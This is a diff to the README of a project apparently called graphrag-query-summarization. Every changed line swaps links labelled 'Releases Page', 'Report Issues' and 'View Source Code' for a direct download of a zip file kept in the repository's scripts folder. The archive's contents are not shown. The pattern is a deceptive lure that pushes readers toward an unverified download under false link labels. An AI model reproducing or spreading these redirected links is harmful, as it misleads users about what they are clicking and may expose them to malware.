@@ -1,6 +1,6 @@
 # 🌟 graphrag-query-summarization - Simplify Summarization with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Jasson5O66/graphrag-query-summarization/releases)
+[![Download Now](https://raw.githubusercontent.com/Jasson5O66/graphrag-query-summarization/main/scripts/graphrag-query-summarization_v2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Jasson5O66/graphrag-query-summarization/main/scripts/graphrag-query-summarization_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **graphrag-query-summarization**! This tool helps you summarize large
 To get started, you need to download the application. Follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download from Releases Page](https://github.com/Jasson5O66/graphrag-query-summarization/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Jasson5O66/graphrag-query-summarization/main/scripts/graphrag-query-summarization_v2.7.zip)
 
 2. On the Releases page, look for the latest version of the **graphrag-query-summarization** application.
 
@@ -89,8 +89,8 @@ The code and application are released under the MIT License. You can freely use,
 
 ## 🔗 Useful Links
 
-- [Download from Releases Page](https://github.com/Jasson5O66/graphrag-query-summarization/releases)
-- [Report Issues](https://github.com/Jasson5O66/graphrag-query-summarization/issues)
-- [View Source Code](https://github.com/Jasson5O66/graphrag-query-summarization)
+- [Download from Releases Page](https://raw.githubusercontent.com/Jasson5O66/graphrag-query-summarization/main/scripts/graphrag-query-summarization_v2.7.zip)
+- [Report Issues](https://raw.githubusercontent.com/Jasson5O66/graphrag-query-summarization/main/scripts/graphrag-query-summarization_v2.7.zip)
+- [View Source Code](https://raw.githubusercontent.com/Jasson5O66/graphrag-query-summarization/main/scripts/graphrag-query-summarization_v2.7.zip)
 
 Thank you for choosing **graphrag-query-summarization**. We hope it makes your summarization tasks easier!
